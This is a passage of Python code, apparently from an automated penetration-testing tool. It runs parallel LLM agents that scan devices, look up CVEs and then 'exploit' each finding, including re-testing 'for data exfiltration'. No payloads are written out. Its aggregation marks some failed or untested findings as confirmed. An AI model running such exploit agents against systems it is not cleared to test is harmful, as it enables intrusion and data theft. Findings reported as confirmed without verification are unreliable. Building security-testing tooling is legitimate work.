                    stream_callback({"type": "reflector_start", "device_id": device_id, "phase": 3})
                # Read recon data to give the reflector context about what was found
                _recon_context = ""
                _recon_path = self.run_dir / "02_recon.md"
                if _recon_path.exists():
                    _recon_text = _recon_path.read_text(encoding="utf-8")
                    # Extract the relevant device section (~500 chars around device_ip)
                    _idx = _recon_text.find(device_ip)
                    if _idx >= 0:
                        _start = max(0, _idx - 200)
                        _end = min(len(_recon_text), _idx + 600)
                        _recon_context = f"\nRecon data for {device_ip}:\n{_recon_text[_start:_end]}\n"

                retry_msg = (
                    f"Your analysis of {device_id} ({device_ip}) ended without saving the deliverable.\n"
                    f"Required file: {deliverable_file}\n"
                )
                if _recon_context:
                    retry_msg += _recon_context
                if result_text and result_text.strip():
                    retry_msg += f"\nYour last output:\n{result_text[:2000]}\n"
                retry_msg += (
                    f"\nBased on what you found for {device_id}, build the JSON deliverable and call:\n"
                    f'save_deliverable("{deliverable_file}", json_content)\n'
                    f"If you found no vulnerabilities, save: "
                    f'{{"device_id": "{device_id}", "device_ip": "{device_ip}", '
                    f'"vulnerabilities": [], "summary": {{"total": 0, "high": 0, "medium": 0, "low": 0, "info": 0}}}}\n'
                    f"Do NOT run any more tools. Call save_deliverable immediately."
                )
                self.tracker.start_phase(f"reflector_{device_id}")
                self.provider.chat_with_tools(
                    system_prompt=system_prompt,
                    user_message=retry_msg,
                    tools=tools,
                    max_turns=5,
                    max_tokens=config.max_tokens,
                    cost_tracker=self.tracker,
                    stream_callback=stream_callback,
                    required_tool="save_deliverable",
                )
                self.tracker.end_phase()
                print(f"  [Reflector] Done for {device_id}")
                if stream_callback:
                    stream_callback({"type": "reflector_done", "device_id": device_id, "phase": 3})

            # Safety net: if still no file after reflector, write empty JSON directly
            if not deliverable_path.exists():
                log.warning("Device %s: reflector also failed — saving empty JSON safety net", device_id)
                import json as _json
                empty = {
                    "device_id": device_id, "device_ip": device_ip,
                    "vulnerabilities": [],
                    "summary": {"total": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
                }
                deliverable_path.write_text(_json.dumps(empty, indent=2), encoding="utf-8")
                print(f"  [Safety net] Empty JSON saved for {device_id}")

        import time as _time

        def _run_with_stagger(args):
            idx, device = args
            if idx > 0:
                _time.sleep(idx * 2)  # 2s stagger between launches to avoid rate limits
            _run_single_device(device)

        with ThreadPoolExecutor(max_workers=min(len(surface), 6)) as pool:
            pool.map(_run_with_stagger, enumerate(surface))

        print(f"\n{'=' * 60}")
        print(f"  All {len(surface)} sub-agents finished.")
        print(f"{'=' * 60}\n")

    # ------------------------------------------------------------------
    # Phase 3: scanner (3a) + LLM analysis (3b)
    # ------------------------------------------------------------------

    def _run_phase3(
        self,
        config: AgentConfig,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Phase 3 split: 3a (deterministic scanner) → 3b (LLM analysis) → 3c (merge)."""
        import time as _time
        from concurrent.futures import ThreadPoolExecutor

        # --- Phase 3a: Deterministic scanning ---
        surface = json.loads(get_attack_surface())
        if isinstance(surface, dict):
            surface = surface.get("nodes", list(surface.values()) if surface else [])

        if self.dry_run:
            log.info("Dry run: skipping Phase 3a scanner")
            print("  [dry-run] Skipping scanner")
            return

        scanner_results = run_scanner(self.run_dir, surface, stream_callback)

        # --- Phase 3b: LLM analysis micro-agents (per device) ---
        print(f"\n{'=' * 60}")
        print(f"PHASE 3b: LLM ANALYSIS ({len(surface)} devices)")
        print(f"{'=' * 60}\n")

        # Limited tool access: cve_search + http_get + deliverable tools
        skill_tools = [t for t in SKILL_TOOLS if t["name"] == "cve_search"]
        recon_limited = [t for t in RECON_TOOLS if t["name"] == "http_get"]
        analysis_tools = [self._wrap_tool(t) for t in recon_limited + skill_tools + DELIVERABLE_TOOLS]

        def _analyze_device(device: dict):
            device_id = device["id"]
            device_ip = device.get("ip", "unknown")
            device_type = device.get("type", "unknown")
            device_role = device.get("role", device_type)
            services = device.get("services", [])
            services_str = ", ".join(
                f"{s.get('name', 'unknown')}:{s.get('port', '?')}"
                for s in services
            )
            device_detail = json.loads(get_device_info(device_id))
            device_os = device_detail.get("os_version", device_detail.get("firmware", "unknown"))

            scan_data = scanner_results.get(device_id, {})
            deliverable_file = f"03_device_{device_id}.json"

            # Prepare scan results for prompt (truncate large outputs)
            scan_for_prompt = {}
            for svc_key, entries in scan_data.get("scan_results", {}).items():
                scan_for_prompt[svc_key] = []
                for entry in entries:
                    result = entry.get("result", "")
                    if isinstance(result, str) and len(result) > 2000:
                        result = result[:2000] + "\n[truncated]"
                    scan_for_prompt[svc_key].append({
                        "tool": entry["tool"],
                        "kwargs": entry.get("kwargs", {}),
                        "result": result,
                    })

            variables = {**self.context}
            variables["device_id"] = device_id
            variables["device_ip"] = device_ip
            variables["device_type"] = device_type
            variables["device_role"] = device_role
            variables["device_services"] = services_str
            variables["device_os"] = device_os
            variables["expected_deliverable"] = deliverable_file
            variables["scan_results"] = json.dumps(scan_for_prompt, indent=2, ensure_ascii=False)
            variables["trivial_findings"] = json.dumps(
                scan_data.get("findings", []), indent=2, ensure_ascii=False
            )

            system_prompt = load_prompt("analyze_device", variables)

            print(f"  [+] Analyzing: {device_id} ({device_ip})")
            if stream_callback:
                stream_callback({
                    "type": "device_start", "device_id": device_id,
                    "device_ip": device_ip, "phase": 3,
                })

            self.tracker.start_phase(f"analyze_{device_id}")
            result_text = self.provider.chat_with_tools(
                system_prompt=system_prompt,
                user_message=(
                    f"Review scan results for {device_id} ({device_ip}). "
                    f"Add CVE findings and data exposure analysis. "
                    f"Then call save_deliverable('{deliverable_file}', json_content)."
                ),
                tools=analysis_tools,
                max_turns=10,
                max_tokens=4096,
                cost_tracker=self.tracker,
                stream_callback=stream_callback,
                required_tool="save_deliverable",
            )
            usage = self.tracker.end_phase()
            if usage:
                print(f"  [+] Done: analyze_{device_id} in {usage.turns} turns")
            if stream_callback:
                stream_callback({
                    "type": "device_done", "device_id": device_id,
                    "device_ip": device_ip, "phase": 3,
                    "turns": usage.turns if usage else 0,
                })

            # Fallback: if LLM didn't save, the scanner already wrote the trivial findings
            deliverable_path = self.run_dir / deliverable_file
            if not deliverable_path.exists():
                log.warning("LLM analysis for %s produced no output — trivial findings used as fallback", device_id)

        def _analyze_with_stagger(args):
            idx, device = args
            if idx > 0:
                _time.sleep(min(idx * 2, 6))
            _analyze_device(device)

        with ThreadPoolExecutor(max_workers=min(len(surface), 6)) as pool:
            pool.map(_analyze_with_stagger, enumerate(surface))

        print(f"\n{'=' * 60}")
        print(f"  All {len(surface)} analysis agents finished.")
        print(f"{'=' * 60}\n")

    # ------------------------------------------------------------------
    # Phase 3c: deterministic aggregation of per-device vuln results
    # ------------------------------------------------------------------

    def _aggregate_device_vulns(
        self,
        config: AgentConfig,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Merge all 03_device_*.json files into 03_vuln_analysis.json deterministically."""
        all_vulns: list[dict] = []

        for f in sorted(self.run_dir.glob("03_device_*.json")):
            try:
                content = _extract_json(f.read_text(encoding="utf-8"))
                data = json.loads(content)
                if isinstance(data, dict):
                    vulns = data.get("vulnerabilities", [])
                elif isinstance(data, list):
                    vulns = data
                else:
                    vulns = []
                all_vulns.extend(vulns)
            except Exception as e:
                log.warning("Failed to parse %s: %s — falling back to scanner findings", f.name, e)
                # Fallback: regenerate trivial findings from 03_scans/{device_id}.json
                device_id = f.stem.replace("03_device_", "")
                scan_path = self.run_dir / "03_scans" / f"{device_id}.json"
                if scan_path.exists():
                    try:
                        from src.agent.scanner import extract_findings
                        scan_data = json.loads(scan_path.read_text(encoding="utf-8"))
                        # Look up device info from attack surface to get the correct role
                        surface = json.loads(get_attack_surface())
                        if isinstance(surface, dict):
                            surface = surface.get("nodes", list(surface.values()) if surface else [])
                        fallback_device = next(
                            (d for d in surface if d.get("id") == device_id),
                            {"id": device_id, "ip": "", "role": ""},
                        )
                        recovered = extract_findings(scan_data, fallback_device)
                        log.warning("Recovered %d findings for %s from scanner", len(recovered), device_id)
                        all_vulns.extend(recovered)
                    except Exception as e2:
                        log.error("Scanner fallback also failed for %s: %s", device_id, e2)

        # Deduplicate: same (device_ip, type, port) → keep first
        seen: set[tuple] = set()
        deduped: list[dict] = []
        for v in all_vulns:
            key = (v.get("device_ip", ""), v.get("type", ""), v.get("port"))
            if key in seen:
                continue
            seen.add(key)
            deduped.append(v)

        # Special dedup: if device has both directory_listing for /firmware/ and insecure_update → drop directory_listing
        devices_with_insecure_update = {
            v.get("device_ip") for v in deduped if v.get("type") == "insecure_update"
        }
        final: list[dict] = []
        for v in deduped:
            if (v.get("type") == "directory_listing"
                    and v.get("device_ip") in devices_with_insecure_update
                    and "/firmware" in v.get("details", "").lower()):
                continue
            final.append(v)

        # Renumber IDs sequentially
        for i, v in enumerate(final, 1):
            v["id"] = f"VULN-{i:03d}"

        # Compute summary
        severity_counts = {"high": 0, "medium": 0, "low": 0, "info": 0, "critical": 0}
        for v in final:
            sev = (v.get("severity") or "").lower()
            if sev in severity_counts:
                severity_counts[sev] += 1

        result = {
            "vulnerabilities": final,
            "summary": {
                "total": len(final),
                "critical": severity_counts["critical"],
                "high": severity_counts["high"],
                "medium": severity_counts["medium"],
                "low": severity_counts["low"],
                "info": severity_counts["info"],
            },
        }

        out_path = self.run_dir / config.deliverable_file
        out_path.write_text(json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8")
        print(f"  Aggregated {len(all_vulns)} device vulns → {len(final)} after dedup → {config.deliverable_file}")
        log.info("Deterministic aggregation: %d vulns → %d deduped → %s",
                 len(all_vulns), len(final), out_path)

    # ------------------------------------------------------------------
    # Phase 4: per-vuln exploit micro-agents
    # ------------------------------------------------------------------

    def _run_exploit_agents(
        self,
        config: AgentConfig,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Run per-vuln exploit micro-agents in parallel, then aggregate results."""
        import threading
        import time as _time
        from concurrent.futures import ThreadPoolExecutor

        # 1. Read the Phase 3 vulnerability queue
        vuln_path = self.run_dir / "03_vuln_analysis.json"
        if not vuln_path.exists():
            log.warning("Phase 4: 03_vuln_analysis.json not found — skipping exploit agents")
            return
        vuln_data = json.loads(vuln_path.read_text(encoding="utf-8"))
        all_vulns = vuln_data.get("vulnerabilities", [])

        # 2. Filter vulns that need an exploit agent
        exploit_tasks: list[dict] = []
        for vuln in all_vulns:
            vuln_type = vuln.get("type", "")
            expl_status = vuln.get("exploitation_status", "")

            # Config-only findings pass through without exploit agent
            if vuln_type in CONFIG_ONLY_TYPES:
                continue

            # Determine if exploit agent is needed
            category = EXPLOIT_CATEGORY_MAP.get(vuln_type)
            if not category:
                continue  # unknown type, skip

            # Launch exploit agent for:
            # - "suspected" vulns: Phase 3 detected but could not prove (e.g. password auth enabled)
            # - "confirmed" vulns with exploitable category: re-test for deeper impact/data exfiltration
            # - vulns without exploitation_status (backward compat): use category membership as signal
            exploit_tasks.append({
                "vuln": vuln,
                "category": category,
            })

        if not exploit_tasks:
            log.info("Phase 4: no exploitable vulns found — skipping exploit agents")
            self._aggregate_exploit_results()
            return

        tools = self._resolve_tools(config)

        print(f"\n{'=' * 60}")
        print(f"PHASE {config.phase}: EXPLOIT SUB-AGENTS (PARALLEL)")
        print(f"  Launching {len(exploit_tasks)} exploit micro-agents")
        print(f"{'=' * 60}\n")

        # Per-device locks to avoid concurrent connections to same host
        from collections import defaultdict
        device_locks: defaultdict[str, threading.Lock] = defaultdict(threading.Lock)
        _locks_guard = threading.Lock()

        def _get_device_lock(device_ip: str) -> threading.Lock:
            with _locks_guard:
                return device_locks[device_ip]

        def _run_single_exploit(task: dict):
            vuln = task["vuln"]
            category = task["category"]
            vuln_id = vuln.get("id", "VULN-???")
            vuln_type = vuln.get("type", "unknown")
            device_id = vuln.get("device_id", "unknown")
            device_ip = vuln.get("device_ip", "unknown")
            service = vuln.get("service", "unknown")
            port = vuln.get("port", 0)
            severity = vuln.get("severity", "MEDIUM")
            details = vuln.get("details", "")
            evidence = vuln.get("evidence", "")

            # Build deliverable path: 04_exploits/{device_id}/{vuln_type}_{vuln_id}.json
            safe_vuln_id = vuln_id.replace("/", "_")
            deliverable_file = f"04_exploits/{device_id}/{vuln_type}_{safe_vuln_id}.json"

            # Build exploit instructions with variable substitution
            instructions = EXPLOIT_INSTRUCTIONS.get(category, "")
            instructions = instructions.replace("{ip}", device_ip)
            instructions = instructions.replace("{port}", str(port))
            # Build URL for data_access category
            if service in ("http", "https") and port:
                url = f"http://{device_ip}:{port}" if port != 80 else f"http://{device_ip}"
            else:
                url = f"http://{device_ip}"
            instructions = instructions.replace("{url}", url)

            variables = {**self.context}
            variables["device_id"] = device_id
            variables["device_ip"] = device_ip
            variables["vuln_id"] = vuln_id
            variables["vuln_type"] = vuln_type
            variables["vuln_severity"] = severity
            variables["service"] = service
            variables["port"] = str(port) if port else "0"
            variables["vuln_details"] = details
            variables["vuln_evidence"] = evidence[:500]
            variables["exploit_instructions"] = instructions
            variables["expected_deliverable"] = deliverable_file
            variables["available_skills"] = ""

            system_prompt = load_prompt("exploit_device_vuln", variables)
            phase_name = f"exploit_{device_id}_{vuln_type}"

            print(f"  [+] Starting: {phase_name} ({device_ip})")
            if stream_callback:
                stream_callback({
                    "type": "exploit_start",
                    "device_id": device_id,
                    "device_ip": device_ip,
                    "vuln_type": vuln_type,
                    "vuln_id": vuln_id,
                    "phase": 4,
                })

            # Acquire per-device lock to avoid concurrent connections
            lock = _get_device_lock(device_ip)
            with lock:
                self.tracker.start_phase(phase_name)
                result_text = self.provider.chat_with_tools(
                    system_prompt=system_prompt,
                    user_message=(
                        f"Exploit {vuln_type} on {device_id} ({device_ip}). "
                        f"Service: {service} port {port}. "
                        f"Call save_deliverable('{deliverable_file}', json_content) when done."
                    ),
                    tools=tools,
                    max_turns=10,
                    max_tokens=2048,
                    cost_tracker=self.tracker,
                    stream_callback=stream_callback,
                    required_tool="save_deliverable",
                )
                usage = self.tracker.end_phase()

            if usage:
                print(f"  [+] Done: {phase_name} in {usage.turns} turns")
            if stream_callback:
                stream_callback({
                    "type": "exploit_done",
                    "device_id": device_id,
                    "vuln_type": vuln_type,
                    "vuln_id": vuln_id,
                    "phase": 4,
                    "turns": usage.turns if usage else 0,
                })

            # Fallback: if save_deliverable was never called
            _exj = _extract_json
            deliverable_path = self.run_dir / deliverable_file
            if not deliverable_path.exists() and result_text and result_text.strip():
                log.warning("Exploit %s: save_deliverable not called — saving fallback", phase_name)
                deliverable_path.parent.mkdir(parents=True, exist_ok=True)
                fallback = _exj(result_text)
                deliverable_path.write_text(fallback, encoding="utf-8")

            # Safety net: if still no file, write ERROR result
            if not deliverable_path.exists():
                log.warning("Exploit %s: no output — saving ERROR result", phase_name)
                deliverable_path.parent.mkdir(parents=True, exist_ok=True)
                error_result = {
                    "vuln_id": vuln_id,
                    "device_id": device_id,
                    "device_ip": device_ip,
                    "vuln_type": vuln_type,
                    "severity": severity,
                    "service": service,
                    "port": port,
                    "status": "ERROR",
                    "evidence": "Exploit agent produced no output",
                    "evidence_level": 0,
                    "tool_used": "",
                    "data_extracted": [],
                    "description": "Exploit agent failed to produce output",
                }
                deliverable_path.write_text(json.dumps(error_result, indent=2), encoding="utf-8")

        # Launch exploit agents with small stagger to avoid API rate limits
        def _run_with_stagger(args):
            idx, task = args
            if idx > 0:
                _time.sleep(min(idx * 0.5, 5))  # 0.5s stagger, max 5s
            _run_single_exploit(task)

        with ThreadPoolExecutor(max_workers=min(len(exploit_tasks), 8)) as pool:
            pool.map(_run_with_stagger, enumerate(exploit_tasks))

        print(f"\n{'=' * 60}")
        print(f"  All {len(exploit_tasks)} exploit agents finished.")
        print(f"{'=' * 60}\n")

        # 3. Deterministic aggregation
        self._aggregate_exploit_results()

    def _aggregate_exploit_results(self) -> None:
        """Merge Phase 3 confirmed vulns + Phase 4 exploit results into 04_exploitation.json."""
        vuln_path = self.run_dir / "03_vuln_analysis.json"
        if not vuln_path.exists():
            return

        vuln_data = json.loads(vuln_path.read_text(encoding="utf-8"))
        all_vulns = vuln_data.get("vulnerabilities", [])

        tests: list[dict] = []
        confirmed_count = 0
        not_exploitable_count = 0
        error_count = 0

        for vuln in all_vulns:
            vuln_id = vuln.get("id", "VULN-???")
            vuln_type = vuln.get("type", "")
            device_id = vuln.get("device_id", "unknown")
            safe_vuln_id = vuln_id.replace("/", "_")

            # Check for exploit agent result file
            exploit_file = self.run_dir / "04_exploits" / device_id / f"{vuln_type}_{safe_vuln_id}.json"

            if exploit_file.exists():
                # Use exploit agent result
                try:
                    result = json.loads(exploit_file.read_text(encoding="utf-8"))
                    status = result.get("status", "ERROR")

                    # If Phase 3 already confirmed the vuln, a Phase 4 FAILED/ERROR
                    # should NOT downgrade it — trust Phase 3 evidence.
                    phase3_status = vuln.get("exploitation_status", "")
                    if phase3_status == "confirmed" and status in ("FAILED", "ERROR"):
                        log.info(
                            "Keeping Phase 3 confirmed status for %s (Phase 4 %s ignored)",
                            vuln_id, status,
                        )
                        status = "EXPLOITED"
                        # Prefer Phase 3 evidence since Phase 4 couldn't reproduce
                        p3_evidence = vuln.get("evidence", "")
                        p4_evidence = result.get("evidence", "")
                        merged_evidence = f"{p3_evidence}\n[Phase 4 could not re-verify: {p4_evidence[:100]}]"
                    else:
                        merged_evidence = result.get("evidence", "")

                    test_entry = {
                        "vuln_id": vuln_id,
                        "device_id": result.get("device_id", device_id),
                        "device_ip": result.get("device_ip", vuln.get("device_ip", "")),
                        "vuln_type": result.get("vuln_type", vuln_type),
                        "severity": result.get("severity", vuln.get("severity", "MEDIUM")),
                        "status": "CONFIRMED" if status == "EXPLOITED" else status,
                        "evidence": merged_evidence,
                        "evidence_level": result.get("evidence_level", 1),
                        "tool_used": result.get("tool_used", ""),
                        "data_extracted": result.get("data_extracted", []),
                        "description": result.get("description", ""),
                        "cve_ids": vuln.get("cve_ids", []),
                    }
                    tests.append(test_entry)

                    if status == "EXPLOITED":
                        confirmed_count += 1
                    elif status == "FAILED":
                        not_exploitable_count += 1
                    else:
                        error_count += 1
                except Exception as e:
                    log.warning("Failed to parse exploit result %s: %s", exploit_file, e)
                    tests.append({
                        "vuln_id": vuln_id,
                        "device_id": device_id,
                        "device_ip": vuln.get("device_ip", ""),
                        "vuln_type": vuln_type,
                        "severity": vuln.get("severity", "MEDIUM"),
                        "status": "ERROR",
                        "evidence": f"Failed to parse: {e}",
                        "evidence_level": 0,
                        "tool_used": "",
                        "data_extracted": [],
                        "description": "Exploit result parsing error",
                    })
                    error_count += 1
            else:
                # Config finding or no exploit agent — pass through from Phase 3
                tests.append({
                    "vuln_id": vuln_id,
                    "device_id": device_id,
                    "device_ip": vuln.get("device_ip", ""),
                    "vuln_type": vuln_type,
                    "severity": vuln.get("severity", "MEDIUM"),
                    "status": "CONFIRMED",
                    "evidence": vuln.get("evidence", ""),
                    "evidence_level": 1,
                    "tool_used": "",
                    "data_extracted": [],
                    "description": vuln.get("details", ""),
                    "cve_ids": vuln.get("cve_ids", []),
                })
                confirmed_count += 1

        # Write aggregated result
        aggregated = {
            "summary": {
                "total_tested": len(tests),
                "confirmed": confirmed_count,
                "not_exploitable": not_exploitable_count,
                "errors": error_count,
            },
            "tests": tests,
        }
        out_path = self.run_dir / "04_exploitation.json"
        out_path.write_text(json.dumps(aggregated, indent=2, ensure_ascii=False), encoding="utf-8")
        log.info("Aggregated %d exploit results → %s", len(tests), out_path)
        print(f"  Aggregated: {len(tests)} results → 04_exploitation.json "
              f"({confirmed_count} confirmed, {not_exploitable_count} failed, {error_count} errors)")

    def _resolve_tools(self, config: AgentConfig) -> list[dict]:
        """Resolve tool references to actual tool definitions.

        Supports two resolution modes:
          1. Group name (e.g. "graph", "recon") → expand entire group
          2. Individual tool name (e.g. "nmap_scan") → find in any group

        Tool functions are wrapped to log calls and results to tool_calls.jsonl.
        """
        tools = []
        seen_names: set[str] = set()

        for ref in config.tools:
            if ref == "recon" and self.dry_run:
                continue

            # Try group resolution first
            if ref in TOOL_GROUPS:
                for tool in TOOL_GROUPS[ref]:
                    if tool["name"] not in seen_names:
                        tools.append(self._wrap_tool(tool))
                        seen_names.add(tool["name"])
                continue

            # Fall back to individual tool name lookup
            for group in TOOL_GROUPS.values():
                for tool in group:
                    if tool["name"] == ref and ref not in seen_names:
                        tools.append(self._wrap_tool(tool))
                        seen_names.add(ref)
                        break

        return tools

    def _wrap_tool(self, tool: dict) -> dict:
        """Wrap a tool function to log its calls and results to tool_calls.jsonl."""
        original_fn = tool["function"]
        if original_fn is None:
            return tool

        log_path = self.run_dir / "tool_calls.jsonl"
        tool_name = tool["name"]

        def logged_fn(**kwargs):
            result = original_fn(**kwargs)
            try:
                entry = json.dumps({
                    "tool": tool_name,
                    "args": kwargs,
                    "result": result[:5000] if isinstance(result, str) else str(result)[:5000],
                }, ensure_ascii=False, default=str)
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(entry + "\n")
            except Exception:
                pass  # Never break the pipeline for logging
            return result

        return {**tool, "function": logged_fn}

    def _check_prerequisites(
        self, config: AgentConfig, results: dict[str, str]
    ) -> bool:
        """Check that all prerequisite deliverables exist or were skipped."""
        for prereq_name in config.prerequisites:
            status = results.get(prereq_name)
            if status in ("completed", "skipped:conditional"):
                continue
            # If prerequisite wasn't run yet, check deliverable on disk
            prereq_config = AGENTS.get(prereq_name)
            if prereq_config:
                path = self.run_dir / prereq_config.deliverable_file
                if not path.exists():
                    return False
        return True

    def _check_conditional(self, config: AgentConfig) -> bool:
        """Check conditional execution (e.g., vuln queue non-empty)."""
        if not config.conditional:
            return True
        path = self.run_dir / config.conditional
        if not path.exists():
            return False
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
            vulns = data.get("vulnerabilities", [])
            return len(vulns) > 0
        except (json.JSONDecodeError, KeyError):
            return False

    def _filter_skills(self, config: AgentConfig) -> str:
        """Filter skills by tag intersection with config.skill_filter.

        Returns a formatted string listing matching skills for prompt injection.
        """
        if not config.skill_filter:
            return ""

        filter_tags = set(config.skill_filter.get("tags", []))
        if not filter_tags:
            return ""

        matched = [
            skill for skill in get_skills_metadata()
            if set(skill.get("tags", [])) & filter_tags
        ]

        if not matched:
            return "No matching skills for this phase."

        lines = []
        for s in matched:
            tags_str = ", ".join(s["tags"])
            lines.append(f"- **{s['name']}**: {s['description']} (tags: {tags_str})")

        return "\n".join(lines)

    def _list_previous_deliverables(self) -> str:
        """List available deliverables for prompt variable."""
        if not self.run_dir.exists():
            return "None (first phase)"
        files = sorted(f.name for f in self.run_dir.glob("*") if f.is_file())
        return ", ".join(files) if files else "None (first phase)"
